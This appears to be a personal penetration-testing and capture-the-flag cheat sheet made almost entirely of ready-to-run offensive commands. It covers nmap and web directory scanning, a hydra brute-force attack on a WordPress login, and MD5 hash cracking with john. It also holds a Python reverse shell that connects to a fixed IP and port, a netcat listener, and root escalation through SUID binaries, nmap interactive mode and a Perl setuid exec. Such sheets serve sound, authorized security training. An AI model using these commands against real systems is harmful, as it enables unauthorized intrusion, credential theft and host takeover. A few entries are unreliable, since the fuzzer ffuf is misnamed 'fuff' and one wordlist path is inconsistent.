# Port Enumeration

## NMAP
```bash
mkdir -p scans/nmap
nmap -v -sC -sV -oN scans/nmap/initial $IP
nmap -v -p- -oN scans/nmap/all_ports $IP
```





# Web Tools

## Gobuster
```bash
mkdir -p scans/gobuster
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster/medium_list -x php,sh,cgi,txt,html,js,css,py
```

## Nikto
```bash
mkdir nikto
nikto -h http://$IP | tee nikto/results
```

## FUFF
```bash
fuff -u http://$IP/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```


# Brute Force

## Hydra
```bash
# Format
# sudo hydra -L <Username/List> -P <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"

sudo hydra -l Username -P passwordlist.txt $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:ERROR"
```

## John
```bash
john --wordlist=/usr/share/wordlist/rockyou.txt --format=Raw-MD5 hash.txt
```





# Reverse Shell

## Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.30.23",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Netcat
```bash
nc -lvnp 9999
```

## Stable
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```






# Privilege Escalation

## Finding SUID
```bash
find / -perm -u=s -type f 2> /dev/null
```

## Finding Capabilities
```bash
getcap -r / 2>/dev/null
```

## Tools

### NMAP
```bash
nmap --interactive
!sh
```

### PERL - Capabilities
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```




# Image tools

## STEGHIDE
```bash
steghide extract -sf image.jpg
```



# Useful Websites
- https://gtfobins.github.io/
- https://github.com/JohnHammond/poor-mans-pentest
- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
